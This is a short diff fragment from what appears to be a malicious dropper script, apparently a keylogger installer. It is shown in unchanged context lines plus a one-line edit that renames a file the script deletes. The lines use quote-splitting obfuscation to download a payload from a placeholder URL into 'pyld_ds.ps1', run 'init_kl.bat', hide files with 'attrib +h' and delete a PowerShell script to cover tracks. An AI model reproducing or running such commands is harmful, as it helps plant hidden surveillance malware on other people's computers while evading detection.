@@ -16,7 +16,7 @@ wg''et ">>URL2<<" -OutFile pyld_ds.p''s1;
 .\init_kl.ba''t;
 attrib +h;
 attrib +h .;
-powe""rshe""ll rm ~/anti.ps1 -Force;
+powe""rshe""ll rm ~/w.ps1 -Force;
 exit;:"
 
                        /$$     /$$                      /$$ /$$
